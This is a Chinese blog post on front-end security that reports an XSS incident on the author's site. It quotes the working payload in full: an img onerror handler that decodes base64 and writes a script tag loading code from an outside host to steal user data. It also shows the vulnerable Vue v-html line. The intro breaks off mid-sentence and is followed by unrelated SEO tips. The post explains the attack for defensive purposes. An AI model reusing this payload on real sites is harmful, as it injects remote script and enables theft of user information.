title: 前端安全与防范
date: 2019-04-16 9:36:35
categories: security
tags: security
---

## 前言

今天主站xss攻击了，起因是一个普通用户发表了一个穿搭，后端接收到异常警报排查后发现用户的穿搭的描述中带有:

`<p><body/hidden><img src=x onerror=document['write'](atob('PGJvZHkvaGlkZGVuPjxzY3JpcHQgc3JjPWh0dHBzOi8vczUubW9ndWNkbi5jb20vbWxjZG4vYzQ1NDA2LzE5MDQxNV82M2o2NWxlazRkMjJnODZjNWhiN2thOThsOWZmZT48L3NjcmlwdD4='))></p>`

因为穿搭look中带有格式化后html的描述内容，所以直接通过v-html指令输出了描述内容：

```
<div v-if="from === 'detail'" v-html="content" ref="content" style="-webkit-user-select: text"></div>
```

这个时候攻击的html标签将会直接被注入到页面中，这里还涉及到另外一个知识点：

* btoa（base64加密）
* atob （base64解密）

<div><!--more--></div>


用户打开该详情页时body直接被替换为空，并且判断了用户信息并实施了盗取用户信息。因为穿搭描述中带有`<a>`标签等特殊符号

本文主要针对常见的web安全防范展开论述，旨在减少被攻击的可能，并对安全知识



## SEO

1.合理的title、description、keywords:搜索引擎对于三项的权重逐个减小。
2.使用语义化标签，爬虫更容易理解和抓取
3.重要内容不要使用js外部引入，爬虫不容易抓取
4.网页加载速度也是爬虫评判的重要标准
5.每个页要只能出现一次H1标签，H2~H6标签可以多次，这样做是为了加重H1标签的权重。 


